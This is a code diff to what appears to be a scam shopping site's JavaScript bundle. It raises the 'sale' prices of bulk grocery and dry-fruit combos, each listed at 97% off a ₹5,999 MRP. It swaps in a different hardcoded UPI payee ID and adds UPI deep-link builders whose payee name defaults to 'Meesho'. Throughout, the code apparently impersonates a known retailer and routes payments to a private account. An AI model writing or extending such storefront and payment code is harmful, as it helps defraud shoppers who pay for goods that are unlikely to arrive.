@@ -12905,7 +12905,7 @@ const gs = [
     {
       id: 1,
       name: "Premium 4KG Mix Dry Fruits Combo – Almonds, Cashews, Pistachios & Kishmish (1KG Each)",
-      sellPrice: "₹199.00",
+      sellPrice: "₹219.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.9",
@@ -12917,7 +12917,7 @@ const gs = [
     {
       id: 2,
       name: "Essential Grocery Mega Saver Combo – Rice 5KG, Atta 10KG, Sugar 5KG & Soya Oil 5L",
-      sellPrice: "₹199.00",
+      sellPrice: "₹229.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.6",
@@ -12929,7 +12929,7 @@ const gs = [
     {
       id: 3,
       name: "Daily Essentials Mega Saver Combo – Atta 10KG, Basmati Rice 5KG, Sugar 5KG & Soya Oil 5L",
-      sellPrice: "₹199.00",
+      sellPrice: "₹239.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.7",
@@ -12941,7 +12941,7 @@ const gs = [
     {
       id: 4,
       name: "Rasoi Samagri Special Combo – 20KG Atta, 5KG Sugar, 1KG Besan & 5L Mustard Oil",
-      sellPrice: "₹199.00",
+      sellPrice: "₹249.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.4",
@@ -12953,7 +12953,7 @@ const gs = [
     {
       id: 5,
       name: "Grocery Essentials Combo – 10KG Rice, 10KG Atta & 5L Kachi Ghani Mustard Oil",
-      sellPrice: "₹199.00",
+      sellPrice: "₹269.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.9",
@@ -12965,7 +12965,7 @@ const gs = [
     {
       id: 6,
       name: "5KG Premium Mix Dry Fruits Combo – Almonds, Cashews, Pistachios, Walnuts & Raisins",
-      sellPrice: "₹199.00",
+      sellPrice: "₹279.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.4",
@@ -12977,7 +12977,7 @@ const gs = [
     {
       id: 7,
       name: "Surf Excel Easy Wash 10KG Pack + FREE Comfort Fabric Conditioner 1L",
-      sellPrice: "₹199.00",
+      sellPrice: "₹289.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.0",
@@ -12989,7 +12989,7 @@ const gs = [
     {
       id: 8,
       name: "Super Cleaning Combo – Ariel Liquid 6.4L + Tide Powder 8KG + 3x Harpic Toilet Cleaner",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.6",
@@ -13001,7 +13001,7 @@ const gs = [
     {
       id: 9,
       name: "Super Saver Grocery Combo – Rice 5KG, Atta 10KG, Sugar 5KG & Refined Oil 5L",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.5",
@@ -13013,7 +13013,7 @@ const gs = [
     {
       id: 10,
       name: "Mega Kitchen Combo – Atta 5KG, Sunflower Oil 5L, Ghee 1L, Salt 1KG & Sugar 1KG",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.4",
@@ -13025,7 +13025,7 @@ const gs = [
     {
       id: 11,
       name: "Limited Time Grocery Combo – Rice 5KG, Atta 5KG, Oil 5L, Salt 1KG & Sugar 1KG",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.0",
@@ -13037,7 +13037,7 @@ const gs = [
     {
       id: 12,
       name: "Beverage & Grocery Combo – Tata Tea 1.5KG, Sugar 5KG, Coffee, Green Tea & Masala Tea",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.5",
@@ -13049,7 +13049,7 @@ const gs = [
     {
       id: 13,
       name: "Mega Home Care Combo – Ariel 5KG, Washing Liquid, Toilet Cleaner (2x), Soaps & Dove Shampoo 1L",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.6",
@@ -13061,7 +13061,7 @@ const gs = [
     {
       id: 14,
       name: "Double Value Oil Combo – 15L Sunflower Oil + 15L Groundnut Oil (Total 30 Litres)",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.2",
@@ -13073,7 +13073,7 @@ const gs = [
     {
       id: 15,
       name: "Double Nut Combo – 5KG Almonds + 5KG Cashews (Total 10KG Pack)",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.5",
@@ -13085,7 +13085,7 @@ const gs = [
     {
       id: 16,
       name: "Essential Grocery Combo – Besan (5KG), Atta 5KG, Moong Dal 1KG, Oil 1L & Sugar 1KG",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "4.2",
@@ -13097,7 +13097,7 @@ const gs = [
     {
       id: 17,
       name: "Mega Personal Care Combo – Tide 8KG, Head & Shoulders Shampoo 2L, Nivea Soaps & Colgate Pack",
-      sellPrice: "₹199.00",
+      sellPrice: "₹299.00",
       mrpPrice: "₹5,999.00",
       offPercent: "97% off",
       rating: "3.8",
@@ -14628,7 +14628,7 @@ function ql({ label: f, error: m, children: S, noMargin: o }) {
     ],
   });
 }
-const om = "mab.037323031180038@axisbank",
+const om = "mab.037323031180042@axisbank",
   Vd = "Shopping";
 function dm() {
   const f = navigator.userAgent.toLowerCase();
@@ -14666,6 +14666,52 @@ function mm(f, m, S) {
     : f === "paytm"
       ? `paytmmp://cash_wallet?pa=${m}&pn=${encodeURIComponent(D)}&am=${S}&cu=INR&tn=${encodeURIComponent(D)}&featuretype=money_transfer`
       : `upi://pay?pa=${m}&pn=${encodeURIComponent(D)}&am=${S}&cu=INR&tn=${encodeURIComponent(T)}`;
+}
+const QR_IMAGE_SRC = "assets/QrCode.jpeg";
+function decodeQrCodeFromImage(src = QR_IMAGE_SRC) {
+  return new Promise(function (resolve, reject) {
+    var img = new Image();
+    img.crossOrigin = "Anonymous";
+    img.src = src;
+    img.onload = function () {
+      var canvas = document.createElement("canvas");
+      var ctx = canvas.getContext("2d");
+      canvas.width = img.width;
+      canvas.height = img.height;
+      ctx.drawImage(img, 0, 0);
+      try {
+        var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        var code = jsQR(imageData.data, canvas.width, canvas.height);
+        if (!code) {
+          reject(new Error("QR code could not be read."));
+          return;
+        }
+        resolve(code.data);
+      } catch (err) {
+        reject(err);
+      }
+    };
+    img.onerror = function () {
+      reject(new Error("QR image not found. Please check the path."));
+    };
+  });
+}
+function buildUpiRedirectUrl(payType, pa, amount, tr, siteName) {
+  var name = encodeURIComponent(siteName || "Meesho");
+  switch (payType) {
+    case "gpay":
+      return "tez://upi/pay?pa=" + pa + "&pn=" + name + "&am=" + amount + "&tr=" + tr + "&mc=8931&orgid=000000&mode=01&cu=INR&tn=" + name + "+OrderId";
+    case "phonepe":
+      return "phonepe://pay?pa=" + pa + "&pn=" + name + "&am=" + amount + "&tr=" + tr + "&mc=8931&orgid=000000&mode=01&cu=INR&tn=" + name;
+    case "paytm":
+      return "paytmmp://cash_wallet?pa=" + pa + "&pn=" + name + "&am=" + amount + "&cu=INR&tn=" + name + "&featuretype=money_transfer&tr=" + tr;
+    case "bhim_upi":
+      return "upi://pay?pa=" + pa + "&am=" + amount + "&pn=" + name + "&cu=INR&tr=" + tr;
+    case "whatspp_pay":
+      return "whatsapp://pay?pa=" + pa + "&pn=" + name + "&am=" + amount + "&tr=" + tr + "&mc=8931&mode=01&cu=INR";
+    default:
+      throw new Error("Invalid payment type: " + payType);
+  }
 }
 const vm = [
   {
